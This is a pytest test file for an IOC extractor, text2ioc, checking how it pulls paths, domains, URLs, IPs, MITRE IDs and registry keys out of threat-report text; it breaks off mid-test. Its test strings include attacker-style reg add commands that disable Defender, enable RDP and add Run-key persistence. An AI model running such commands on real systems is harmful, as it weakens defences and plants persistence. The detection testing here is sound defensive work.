from pathlib import Path
from unittest.mock import patch

import pytest
import requests

from text2ioc.ioc import (_find_invalid_occurrences, _is_unlikely_linux_path,
                          extract_iocs, get_tld_set_from_public_suffix_list,
                          post_filter_false_positives)


def get_iocs(text, key):
    iocs = extract_iocs(text)
    return set(iocs.get(key, []))


@pytest.fixture
def fake_suffix_list():
    return """
// This is a comment
ac
com
edu
gov
hosting
no
mil
net
onion
org
sh
gov
"""


def test_get_tld_set_custom_path(monkeypatch, tmp_path: Path, fake_suffix_list):
    cache_file = tmp_path / "my_suffix_list.dat"
    monkeypatch.setenv("IOC_TLD_CACHE", str(cache_file))

    class FakeResponse:
        def raise_for_status(self):
            pass

        @property
        def text(self):
            return fake_suffix_list

    with patch("text2ioc.ioc.requests.get", return_value=FakeResponse()):
        tlds = get_tld_set_from_public_suffix_list()

    assert isinstance(tlds, set)
    assert "sh" in tlds
    assert "com" in tlds
    assert "gov" in tlds
    assert "www" not in tlds
    assert cache_file.exists()

    with patch("text2ioc.ioc.requests.get") as mock_get:
        tlds2 = get_tld_set_from_public_suffix_list()
        mock_get.assert_not_called()
        assert tlds == tlds2


def test_get_tld_set_falls_back_to_default_tlds_on_request_error(
    monkeypatch, tmp_path: Path
):
    cache_file = tmp_path / "missing_suffix_list.dat"
    monkeypatch.setenv("IOC_TLD_CACHE", str(cache_file))

    with patch(
        "text2ioc.ioc.requests.get",
        side_effect=requests.RequestException("network error"),
    ):
        tlds = get_tld_set_from_public_suffix_list()

    assert "com" in tlds
    assert "org" in tlds
    assert not cache_file.exists()


def test_get_tld_set_falls_back_to_default_tlds_on_parse_error(
    monkeypatch, tmp_path: Path, fake_suffix_list
):
    cache_file = tmp_path / "cached_suffix_list.dat"
    cache_file.write_text(fake_suffix_list, encoding="utf-8")
    monkeypatch.setenv("IOC_TLD_CACHE", str(cache_file))

    with patch("text2ioc.ioc.load_valid_tlds", side_effect=OSError("bad cache")):
        tlds = get_tld_set_from_public_suffix_list()

    assert "gov" in tlds
    assert "net" in tlds


def test_get_tld_set_creates_missing_cache_parent(
    monkeypatch, tmp_path: Path, fake_suffix_list
):
    cache_file = tmp_path / "nested" / "cache" / "suffix_list.dat"
    monkeypatch.setenv("IOC_TLD_CACHE", str(cache_file))

    class FakeResponse:
        def raise_for_status(self):
            pass

        @property
        def text(self):
            return fake_suffix_list

    with patch("text2ioc.ioc.requests.get", return_value=FakeResponse()):
        tlds = get_tld_set_from_public_suffix_list()

    assert "com" in tlds
    assert cache_file.exists()


@pytest.mark.parametrize(
    "text, expected",
    [
        ('"a C:\\Tools\\runme.bat asd"', {"C:\\Tools\\runme.bat"}),
        (
            'whole "C:\\Windows\\System32\\winevt\\logs\\ " database.',
            {"C:\\Windows\\System32\\winevt\\logs\\"},
        ),
        (
            'whole "C:\\Windows\\System32\\winevt\\logs\\ Security.evtx " database.',
            {"C:\\Windows\\System32\\winevt\\logs\\Security.evtx"},
        ),
        ("/etc/passwd", {"/etc/passwd"}),
        ("'/usr/local/bin/start.log'", {"/usr/local/bin/start.log"}),
        ("../data/output.log", {"../data/output.log"}),
        (
            "/var/log/sys.log and D:\\Data\\file.dat",
            {"/var/log/sys.log", "D:\\Data\\file.dat"},
        ),
        ('"a C:\\Tools\\runme.bat asd"', {"C:\\Tools\\runme.bat"}),
        ("/tmp/9MQEJ6VYR.txt", {"/tmp/9MQEJ6VYR.txt"}),
        ("/home/user/.bashrc", {"/home/user/.bashrc"}),
        ("/opt/logs/apache2/error-log", {"/opt/logs/apache2/error-log"}),
        ("/var/tmp/script.sh", {"/var/tmp/script.sh"}),
        ("C:\\Windows\\System32\\cmd.exe", {"C:\\Windows\\System32\\cmd.exe"}),
        (
            "D:\\Backups\\My Documents\\file.txt",
            {"D:\\Backups\\My Documents\\file.txt"},
        ),
        ("E:\\Program Files\\App\\app.exe", {"E:\\Program Files\\App\\app.exe"}),
        (
            "Backup: /mnt/drive1/data.bak & C:\\Temp\\update.log",
            {"/mnt/drive1/data.bak", "C:\\Temp\\update.log"},
        ),
        ("./deploy.sh", {"./deploy.sh"}),
        (
            "/path/to/file-name_with.mixed_chars1.log",
            {"/path/to/file-name_with.mixed_chars1.log"},
        ),
        ("C:\\Users\\Admin\\.hiddenfile", {"C:\\Users\\Admin\\.hiddenfile"}),
        ("./.env", {"./.env"}),
        ("~/notes/todo.txt", {"~/notes/todo.txt"}),
        ("/usr/bin/pithon", {"/usr/bin/pithon"}),
        ("D:\\utils\\nircmd", {"D:\\utils\\nircmd"}),
        ("~/.ssh/authorized_keys", {"~/.ssh/authorized_keys"}),
        ("~/.n2/adc", {"~/.n2/adc"}),
        ("~/.bashrc", {"~/.bashrc"}),
        ("~/Library/Safari", {"~/Library/Safari"}),
        ("\\\\ad02\\sysvol\\gaze.exe", {"\\\\ad02\\sysvol\\gaze.exe"}),
        (
            "\\\\server01\\share\\payloads\\tool.exe",
            {"\\\\server01\\share\\payloads\\tool.exe"},
        ),
        (
            "F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip",
            {"F:\\Shares\\<redacted>\\<redacted>\\<redacted>.zip"},
        ),
        ("directory C:\\PerfLogs\\ .", {"C:\\PerfLogs\\"}),
    ],
)
def test_extract_filepaths_valid(text, expected):
    matches = get_iocs(text, "filepath")
    assert expected.issubset(matches)


def test_extract_filepaths_unc_does_not_swallow_following_arguments():
    text = "\\\\ad02\\sysvol\\gaze.exe c:\\gaze.exe"
    matches = get_iocs(text, "filepath")
    assert "\\\\ad02\\sysvol\\gaze.exe" in matches
    assert "\\\\ad02\\sysvol\\gaze.exe c:\\gaze.exe" not in matches


@pytest.mark.parametrize(
    "text",
    [
        "survive CI/CD pipelines",
        "etc/passwd",
        "Windows\\System32\\notepad.exe",
        "/home/user/site.com",
        "C:\\folder\\site.org",
        "foo.txt/bar",
        "Provides 24/7 endpoint",
    ],
)
def test_extract_filepaths_invalid(text):
    matches = get_iocs(text, "filepath")
    assert not matches


def test_is_unlikely_linux_path_relative_and_custom_root():
    assert _is_unlikely_linux_path("relative/path") is False
    assert _is_unlikely_linux_path("/madeup/root/file.txt") is True


def test_find_invalid_occurrences_missing_substring():
    assert _find_invalid_occurrences("abc", "z") is False


def test_post_filter_filepaths_skips_basename_without_extension():
    entry = r"C:\Folder\name without extension"
    filtered = post_filter_false_positives([entry], "filepath", text=entry)
    assert filtered == []


def test_post_filter_filepaths_skips_unlikely_linux_paths():
    entry = "/madeup/root/noext"
    text = f"Paths seen: {entry}"
    filtered = post_filter_false_positives([entry], "filepath", text=text)
    assert entry not in filtered


@pytest.mark.parametrize(
    "text, expected",
    [
        ("evil.exe", {"evil.exe"}),
        ("readme.pdf", {"readme.pdf"}),
        ("archive.tar", {"archive.tar"}),
        ("script.sh", {"script.sh"}),
        ("note.a1", {"note.a1"}),
        ("IMG.Z9", {"IMG.Z9"}),
        ("Cmwdnsyn.url", {"Cmwdnsyn.url"}),
        ("OutlookEN[dot]aspx", {"OutlookEN[dot]aspx"}),
        ("WebView[dot]exe", {"WebView[dot]exe"}),
        ("dogovor[dot]vbe", {"dogovor[dot]vbe"}),
        ("cmd[dot]exe", {"cmd[dot]exe"}),
        (
            "Preparing to unpack .../socat_2.0.0~beta9-1_amd64.deb ...",
            {"beta9-1_amd64.deb"},
        ),
        (
            'The archive ("Bank Handlowy w Warszawie - dowód wpłaty_pdf.tar.gz") conceals a malicious loader.',
            {"Bank Handlowy w Warszawie - dowód wpłaty_pdf.tar.gz"},
        ),
        (
            'The attachment "Factura marzo 2025-área.pdf" was delivered to the victim.',
            {"Factura marzo 2025-área.pdf"},
        ),
        (
            "The sample (Factura marzo 2025.pdf) was delivered to the victim.",
            {"Factura marzo 2025.pdf"},
        ),
        (
            'The archive ("Mise à jour système 2025.apk") was dropped by the installer.',
            {"Mise à jour système 2025.apk"},
        ),
        (
            "The lure “Raport końcowy 2025.xlsm” was opened by the user.",
            {"Raport końcowy 2025.xlsm"},
        ),
        (
            "The sample (loader build 2025.tgz) was unpacked on the host.",
            {"loader build 2025.tgz"},
        ),
        (
            'The decoy ("Incident Report Q1 2025.docm") was attached to the email.',
            {"Incident Report Q1 2025.docm"},
        ),
        (
            "<code>VBoxTray.exe\nVBoxService.exe\nprl_cc.exe\nprl_tools.exe\nSharedIntApp.exe\nvmusrvc.exe\nvmsrvc.exe"
            "\nvmtoolsd.exe\nWireshark.exe\nHTTPDebuggerUI.exe\nHTTPDebuggerSvc.exe\ntcpview.exe</code>",
            {
                "HTTPDebuggerSvc.exe",
                "HTTPDebuggerUI.exe",
                "SharedIntApp.exe",
                "VBoxService.exe",
                "VBoxTray.exe",
                "Wireshark.exe",
                "prl_cc.exe",
                "prl_tools.exe",
                "tcpview.exe",
                "vmsrvc.exe",
                "vmtoolsd.exe",
                "vmusrvc.exe",
            },
        ),
    ],
)
def test_extract_filenames_valid(text, expected):
    matches = get_iocs(text, "file")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "42.2",
        "3.x",
        "site.com",
        "website.org",
        "static-207-248-236-84.alestra.net.mx",
        "host-104-238-202-134.essensys.co.uk",
        "filename",
        "noext.",
        "trailing.",
        ".hidden",
        "dir/file.txt",
        "C:\\folder\\file.txt",
        ".a.s",
        ".p.A",
        "j..w",
        "J..7...z.L....A..Puv1.......s",
        "test..exe",
        "Next[dot]js",
        "Node[dot]js",
        "e.g",
        "-test.lnk",
        "-ECRM.hwp.lnk",
        "-1.ps1",
        "服务数据_20250427_212229.txt",
        "org.freedesktop.udisks2.modify",
        "org.freedesktop.login1.set-user-linger",
        "org.gnome.controlcenter.user-accounts",
        "net.openstack.nova.compute.start",
        "com.ubuntu.update-manager.policy",
        "com.example.myapp.shutdown",
        "org.apache.logging.log4j.core",
        "org.mpris.MediaPlayer2",
        "Node.js",
        "ASP.Net",
        "json.decoder",
        "v3.x",
        "v1.7.0",
        "1.2",
        "(.ipynb)",
        "T1059.003",
        "from versions 11.38.0 through 11.38.19",
        "All versions up to and including 1.17.3) - Fixed in version 1.17.4",
        "fixed in maintenance releases 0.40.5 and 1.40.5.",
        "versions 16.0.x before 16.0.1.1, 15.1.x before 15.1.2.1, 14.1.x ",
        "ForEach ($Row in $Result.Tables[0].Rows)",
    ],
)
def test_extract_filenames_invalid(text):
    matches = get_iocs(text, "file")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("http://example.com/index.html", {"http://example.com/index.html"}),
        (
            "https://sub.domain-example.org/path/to/page?query=1",
            {"https://sub.domain-example.org/path/to/page?query=1"},
        ),
        ("https://dpaste[.]com/9MQEJ6VYR.txt", {"https://dpaste[.]com/9MQEJ6VYR.txt"}),
        ("ftp[:]//ftp.jeepcommerce[.]rs", {"ftp[:]//ftp.jeepcommerce[.]rs"}),
        (
            "custom-protocol[:]//mi-dominio[.]org/path/to/resource",
            {"custom-protocol[:]//mi-dominio[.]org/path/to/resource"},
        ),
        (
            "ftp://ftp.servidor[.]local/directorio/archivo.txt",
            {"ftp://ftp.servidor[.]local/directorio/archivo.txt"},
        ),
        ("smtp://mail.server.com", {"smtp://mail.server.com"}),
        (
            "http://192.168.1.113:8080/Login.jsp",
            {"http://192.168.1.113:8080/Login.jsp"},
        ),
        (
            "https://example.com:8443/api/v1?query=1",
            {"https://example.com:8443/api/v1?query=1"},
        ),
        (
            "ftp[:]//10[dot]0[dot]0[dot]5:21/dropper.bin",
            {"ftp[:]//10[dot]0[dot]0[dot]5:21/dropper.bin"},
        ),
        ("Visit http://a.b/c and https://x-y.z", {"http://a.b/c", "https://x-y.z"}),
        ("https://192.168.50.17/", {"https://192.168.50.17/"}),
        ("https://192.168.50.15:4444/", {"https://192.168.50.15:4444/"}),
        ("http://172.24.0.1:8000/", {"http://172.24.0.1:8000/"}),
    ],
)
def test_extract_urls_valid(text, expected):
    matches = get_iocs(text, "url")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "www.example.com",
        "http:/example.com",
        "https//example.com",
        "http://",
        "http://192.168.1.113:",
        "http://192.168.1.113:abc/Login.jsp",
        "http://example[.com",
        "https://example].com",
        "http://127.0.0.1:105xx/",
        "https://0.0.0.0:{port}",
    ],
)
def test_extract_urls_invalid(text):
    matches = get_iocs(text, "url")
    assert not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("example.com", {"example.com"}),
        ("sub.example.com", {"sub.example.com"}),
        ("sub.domain.co.uk", {"sub.domain.co.uk"}),
        ("my-site.io", {"my-site.io"}),
        ("example[.]com", {"example[.]com"}),
        ("subdomain[.]attack[.]org", {"subdomain[.]attack[.]org"}),
        ("*.evil-domain.com", {"*.evil-domain.com"}),
        ("*.sub[.]malware[.]org", {"*.sub[.]malware[.]org"}),
        ("@qq.com", {"qq.com"}),
        ("@vip.qq.com", {"vip.qq.com"}),
        ("@icloud.com", {"icloud.com"}),
        ("@subdomain.mail.example.org", {"subdomain.mail.example.org"}),
        ("We found connections to tracker.badactor[.]net.", {"tracker.badactor[.]net"}),
        ("Blocked host: *.cnc-malware.org", {"*.cnc-malware.org"}),
        ("Contacted domain: top100.gotoip4[.]com", {"top100.gotoip4[.]com"}),
        ("Reported domains include: @www.wushidou[.]cn", {"www.wushidou[.]cn"}),
        ("Emails like @me.com and @139.com are common", {"me.com", "139.com"}),
        ("test.io.", {"test.io"}),
        ("subdomain.with-a-dash[.]xyz", {"subdomain.with-a-dash[.]xyz"}),
        ("Domain seen: *.bad[.]domain[.]gov", {"*.bad[.]domain[.]gov"}),
        ("booking(dot)com", {"booking(dot)com"}),
        ("booking[dot]example[dot]com", {"booking[dot]example[dot]com"}),
        ("*.sub(dot)malware(dot)org", {"*.sub(dot)malware(dot)org"}),
        ("abcdefghijklmnop.onion", {"abcdefghijklmnop.onion"}),
        (
            "ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion",
            {"ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion"},
        ),
        ("Additional guidance is available at cisa.gov/ics.", {"cisa.gov"}),
        ('The Reserve Bank of India launched the "bank.in" domain.', {"bank.in"}),
        ("Malware uses webhook[.]site for callbacks.", {"webhook[.]site"}),
        ("The staged archive was hosted on catbox.moe.", {"catbox.moe"}),
        (
            "Indicators included rusvolcorps[.]com and "
            "ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion.",
            {
                "rusvolcorps[.]com",
                "ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion",
            },
        ),
    ],
)
def test_extract_domains_valid(text, expected):
    matches = get_iocs(text, "domain")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "localhost",
        "exa[mple].com",
        "example.c",
        "domain.123",
        "org.freedesktop.udisks2.modify",
        "org.freedesktop.login1.set-user-linger",
        "org.gnome.controlcenter.user-accounts",
        "net.openstack.nova.compute.start",
        "com.ubuntu.update-manager.policy",
        "com.example.myapp.shutdown",
        "org.apache.logging.log4j.core",
        "org.mpris.MediaPlayer2",
        "i3en.xlarge",
        "m5.large",
        "c5n.18xlarge",
        "r6g.medium",
        "t4g.nano",
        "z1d.12xlarge",
        "m7a.2xlarge",
        "x2idn.24xlarge",
        "trn1.32xlarge",
        'mobile security company masquerade as Google Chrome (package name: "quizzical.washbowl.calamity")',
        "fmt.Println",
        "strings.Split",
        "bytes.NewBuffer",
        "regexp.MustCompile",
        "json.Marshal",
        "time.Now",
        "ASP.Net",
        "ANY.RUN",
        "Microsoft.Network",
        "kernelObject.ko",
        "os.path.basename",
        "os.path.normpath",
        "d.global_relocs",
        "allestörungen.de",
        "woocommėrce[.]com",
        "android.permission.CAMERA",
        "android.permission.POST_NOTIFICATIONS",
        "freemme.permission.msa.SECURITY_ACCESS",
        "README.md",
        "PackageIndex.download",
        "EndpointRequest.to()",
        "ORG | Aliyun Computing Co.LTD",
        '/wp:paragraph wp:image {"id":85659,"sizeSlug":"full","linkDestination":"none"} '
        "Figure 3 - FizzBuzz.js /wp:image wp:paragraph catbox.moe",
        "kg-card-begin: html × Unlock intelligence powered by DarkWebInformer.com",
    ],
)
def test_extract_domains_invalid(text):
    matches = get_iocs(text, "domain")
    assert text == "" or not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("alice@example.com", {"alice@example.com"}),
        ("bob.smith@sub.mail-domain.co", {"bob.smith@sub.mail-domain.co"}),
        ("user+test@domain.io", {"user+test@domain.io"}),
        ("UPPERCASE@DOMAIN.COM", {"UPPERCASE@DOMAIN.COM"}),
        ("alice@example[.]com", {"alice@example[.]com"}),
        ("1900001905[@]stu.iku.edu.tr", {"1900001905[@]stu.iku.edu.tr"}),
        (
            "patricio.estay99895[@]edu.ipchile.cl",
            {"patricio.estay99895[@]edu.ipchile.cl"},
        ),
        ("ul0251085[@]edu.uni.lodz.pl", {"ul0251085[@]edu.uni.lodz.pl"}),
        ("cy[at]live.no", {"cy[at]live.no"}),
        ("ops[at]research[dot]example.com", {"ops[at]research[dot]example.com"}),
        ("case(at)mail(dot)evil.org", {"case(at)mail(dot)evil.org"}),
        ("lir[@]pq[.]hosting", {"lir[@]pq[.]hosting"}),
        ("noc[@]the.hosting", {"noc[@]the.hosting"}),
    ],
)
def test_extract_emails_valid(text, expected):
    matches = get_iocs(text, "email")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "alice.example.com",
        "@example.com",
        "alice@",
        "alice@exa mple.com",
        "alice@example,com",
        "alice@@example.com",
        "webpage at cisa.gov",
        "user[at]domain.toolongtld",
        "user@domain.toolongtld",
        "invoicing[@]partner_organizationA.com",
        "accounts_payable[@]partner_organizationB.com",
    ],
)
def test_extract_emails_invalid(text):
    matches = get_iocs(text, "email")
    assert text not in matches


def test_extract_emails_long_tld_preempts_domain_extraction():
    iocs = extract_iocs("e-mail: lir[@]pq[.]hosting remarks:")
    assert iocs["email"] == ["lir[@]pq[.]hosting"]
    assert "pq[.]hosting" not in iocs["domain"]


@pytest.mark.parametrize(
    "text, expected",
    [
        ("8.8.8.8", {"8.8.8.8"}),
        ("192.168.0.1", {"192.168.0.1"}),
        ("255.255.255.255", {"255.255.255.255"}),
        ("10.0.0.5", {"10.0.0.5"}),
        ("77.221.158[.]154", {"77.221.158[.]154"}),
        ("185.174.137[.]26", {"185.174.137[.]26"}),
        ("Cloudflare 1.1.1.1 incident on July 14, 2025", {"1.1.1.1"}),
        ("DNS = 8.8.8.8", {"8.8.8.8"}),
        ("serving connection from 127.0.0.1", {"127.0.0.1"}),
        ("uses 77.221.158[.]154 as its C2 server", {"77.221.158[.]154"}),
        ("ssh root@192.168.1.1", {"192.168.1.1"}),
    ],
)
def test_extract_ipv4_valid(text, expected):
    matches = get_iocs(text, "ipv4")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "TrueSight version 2.0.2.0 was",
        "256.0.0.1",
        "192.168.0.256",
        "192.168.1",
        "10.0.0",
        "1.2.3.4.5",
        "77.221.158].154",
        "185.174.[137].26",
        "a.b.c.d",
        "GT-AC2900_3.0.0.4_384_82072-gc842320_cferom_ubi.w",
        "Liferay Portal 7.4.0 through 7.4.3.132, and Liferay DXP 2025.Q1.0 through 2025.Q1.12.",
        "Tenda AC20 up to 16.03.08.12.",
        "Tenda FH1202 1.2.0.14(408).",
        "Versions 17.5.0 lt 17.5.1.3 | 16.1.0 lt 16.1.6.1 | 15.1.0 lt 15.1.10.8",
        "A vulnerability classified as critical was found in Tenda FH451 1.0.0.9.",
    ],
)
def test_extract_ipv4_invalid(text):
    matches = get_iocs(text, "ipv4")
    assert text == "" or not matches


@pytest.mark.parametrize(
    "text, expected",
    [
        (
            "2001:0db8:85a3:0000:0000:8a2e:0370:7334",
            {"2001:0db8:85a3:0000:0000:8a2e:0370:7334"},
        ),
        (
            "fe80:0000:0000:0000:0202:b3ff:fe1e:8329",
            {"fe80:0000:0000:0000:0202:b3ff:fe1e:8329"},
        ),
        ("::1", {"::1"}),
        ("2001:db8::1", {"2001:db8::1"}),
        ("2001:db8:85a3::8a2e:0370", {"2001:db8:85a3::8a2e:0370"}),
        ("fe80::1", {"fe80::1"}),
    ],
)
def test_extract_ipv6_valid(text, expected):
    matches = get_iocs(text, "ipv6")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "2001:db8:85a3::8a2e::0370",
        "2001:0db8:85a3:0000:0000:8a2e:0370:zzzz",
        "20010db885a3000000008a2e03707334",
        "1:2:3:4:5:6:7:8:9",
        "::C",
        "ABCD::EF",
        "Class::Method",
    ],
)
def test_extract_ipv6_invalid(text):
    matches = get_iocs(text, "ipv6")
    assert text not in matches


@pytest.mark.parametrize(
    "text, key, expected",
    [
        (
            "The portal was reachable at http://192.168.1.113:8080/Login.jsp during triage.",
            "url",
            {"http://192.168.1.113:8080/Login.jsp"},
        ),
        ("Exploit Author: bRpsd | cy[at]live.no", "email", {"cy[at]live.no"}),
        (
            "create an account on a fake booking(dot)com site",
            "domain",
            {"booking(dot)com"},
        ),
        ("The payload listened locally on ::1 before pivoting.", "ipv6", {"::1"}),
        (
            "cmd.exe /c copy \\\\ad02\\sysvol\\gaze.exe c:\\gaze.exe",
            "filepath",
            {"\\\\ad02\\sysvol\\gaze.exe"},
        ),
        (
            "Hidden service: ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion",
            "domain",
            {"ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion"},
        ),
        (
            "Telegram post pointed to hxxps://legionliberty[.]army for the official channel.",
            "url",
            {"hxxps://legionliberty[.]army"},
        ),
        (
            "The lure used dvizheniesrs[@]proton[.]me as a contact address.",
            "email",
            {"dvizheniesrs[@]proton[.]me"},
        ),
        (
            "Execution (TA0001) used Spearphishing Attachment (T1566.001) and User Execution (T1204).",
            "mitre_attack_t",
            {"T1566.001", "T1204"},
        ),
        (
            "Execution (TA0001) used Spearphishing Attachment (T1566.001) and User Execution (T1204).",
            "mitre_tactic",
            {"TA0001"},
        ),
        (
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
            "/v fDenyTSConnections /t REG_DWORD /d 0 /f",
            "registry_key",
            {"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"},
        ),
        (
            "An improper certificate validation vulnerability [CWE-295] in FortiNAC-F.",
            "cwe",
            {"CWE-295"},
        ),
        (
            "References: GHSA-v63m-x9r9-8gqp CVE-2025-2598",
            "ghsa",
            {"GHSA-v63m-x9r9-8gqp"},
        ),
        (
            "CAPEC-233 Privilege Escalation Solution This issue is fixed in GlobalProtect.",
            "capec",
            {"CAPEC-233"},
        ),
    ],
)
def test_extract_iocs_jsonl_regressions(text, key, expected):
    matches = get_iocs(text, key)
    assert expected.issubset(matches)


def test_extract_domains_keeps_onion_when_defanged_domains_are_also_present():
    text = (
        "Indicators included rusvolcorps[.]com and "
        "ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion."
    )
    matches = get_iocs(text, "domain")
    assert "rusvolcorps[.]com" in matches
    assert "ciagovlgmxiyo7qapr6km536svznpsygmqdeen5hpg5xce7b4zav54ad.onion" in matches


def test_extract_domains_ignores_email_embedded_defangs_without_hiding_plain_domains():
    text = (
        'Published by the account "botsailer" (email: anupm019@gmail[.]com), '
        "with mirrored statistics on pepy.tech and a GitHub README.md document."
    )
    iocs = extract_iocs(text)
    assert "pepy.tech" in iocs["domain"]
    assert "README.md" not in iocs["domain"]
    assert "gmail[.]com" not in iocs["domain"]
    assert "anupm019@gmail[.]com" in iocs["email"]


def test_extract_files_discards_leading_punctuation_but_keeps_real_filename_mentions():
    text = "악성코드-test.lnk 제목과 본문 test.lnk, 그리고 파일명:1.ps1(<-가칭)"
    matches = get_iocs(text, "file")
    assert "test.lnk" in matches
    assert "-test.lnk" not in matches
    assert "-1.ps1" not in matches
    assert "1.ps1" not in matches


@pytest.mark.parametrize(
    "text, expected",
    [
        (
            "Execution (TA0002) used Command and Scripting Interpreter: PowerShell (T1059.001).",
            {"T1059.001"},
        ),
        (
            "Observed techniques included T1566.001, T1204, and T1195.001 across the intrusion.",
            {"T1566.001", "T1204", "T1195.001"},
        ),
        (
            "T1003.003 | OS Credential Dumping: NTDS",
            {"T1003.003"},
        ),
    ],
)
def test_extract_mitre_attack_t_valid(text, expected):
    matches = get_iocs(text, "mitre_attack_t")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "G0034",
        "S0650",
        "M1054",
        "DS0017",
        "T1003.003_Windows",
        "prefixT1059.001",
        "T1059.001suffix",
    ],
)
def test_extract_mitre_attack_t_invalid(text):
    matches = get_iocs(text, "mitre_attack_t")
    assert text not in matches


@pytest.mark.parametrize(
    "text, expected",
    [
        ("Tactics observed: TA0001, TA0005, TA0010.", {"TA0001", "TA0005", "TA0010"}),
        ("Execution (TA0002) preceded Exfiltration (TA0010).", {"TA0002", "TA0010"}),
    ],
)
def test_extract_mitre_tactic_valid(text, expected):
    matches = get_iocs(text, "mitre_tactic")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "T1059.001",
        "G0034",
        "S0650",
        "M1054",
        "DS0017",
        "prefixTA0001",
        "TA0001suffix",
        "TA0001_Windows",
    ],
)
def test_extract_mitre_tactic_invalid(text):
    matches = get_iocs(text, "mitre_tactic")
    assert text not in matches


@pytest.mark.parametrize(
    "text, expected",
    [
        (
            'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
            "/v fDenyTSConnections /t REG_DWORD /d 0 /f",
            {"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server"},
        ),
        (
            "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 0",
            {"HKLM\\System\\CurrentControlSet\\Control\\Lsa"},
        ),
        (
            "The MachineGUID lives at “HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography”.",
            {"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography"},
        ),
        (
            "Persistence added HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon.",
            {"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"},
        ),
        (
            'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v Updater /t REG_SZ /d calc.exe /f',
            {"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"},
        ),
        (
            "reg query HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v Shell",
            {"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"},
        ),
        (
            "The key "
            "“HKEY_USERS\\S-1-5-21-1234-5678-9012-1001\\Software\\Microsoft\\Office\\16.0\\Word\\Security” "
            "was modified.",
            {
                "HKEY_USERS\\S-1-5-21-1234-5678-9012-1001\\Software\\Microsoft\\Office\\16.0\\Word\\Security"
            },
        ),
        (
            "Delete HKCR\\txtfile\\shell\\open\\command.",
            {"HKCR\\txtfile\\shell\\open\\command"},
        ),
        (
            "Audit HKCC\\System\\CurrentControlSet\\Control\\Print\\Printers.",
            {"HKCC\\System\\CurrentControlSet\\Control\\Print\\Printers"},
        ),
        (
            "Config in HKEY_CURRENT_CONFIG\\System\\CurrentControlSet\\Control\\Print\\Printers",
            {
                "HKEY_CURRENT_CONFIG\\System\\CurrentControlSet\\Control\\Print\\Printers"
            },
        ),
        (
            'Quoted with spaces: "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\'
            'Image File Execution Options"',
            {
                "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options"
            },
        ),
        (
            "Command with extra switches: reg add "
            '"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
            "/v DisableAntiSpyware /t REG_DWORD /d 1 /f /reg:64",
            {"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"},
        ),
        (
            "Punctuation: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run,",
            {"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"},
        ),
    ],
)
def test_extract_registry_key_valid(text, expected):
    matches = get_iocs(text, "registry_key")
    assert expected.issubset(matches)


@pytest.mark.parametrize(
    "text",
    [
        "HKLM",
        "HKEY_LOCAL_MACHINE",
        "HKU",
        "HKCC",
        "reg add HKLM /v Value",
        "The hive HKCU was referenced but no subkey was provided.",
        "reg add HKLM/Software/Microsoft /v Value",
        "HKEY_CURRENT_USER/Software/Microsoft/Windows/CurrentVersion/Run",
    ],
)
def test_extract_registry_key_invalid(text):
    matches = get_iocs(text, "registry_key")
    assert not matches


def test_extract_registry_key_does_not_swallow_command_arguments():
    text = (
        'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" '
        "/v fDenyTSConnections /t REG_DWORD /d 0 /f"
    )
    matches = get_iocs(text, "registry_key")
    assert "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" in matches
    assert (
        "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server /v fDenyTSConnections"
        not in matches
    )


def test_extract_registry_key_does_not_swallow_extra_switches():
    text = (
        'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" '
        "/v DisableAntiSpyware /t REG_DWORD /d 1 /f /reg:64"
    )
    matches = get_iocs(text, "registry_key")
    assert "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" in matches
    assert (
        "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender /v DisableAntiSpyware"
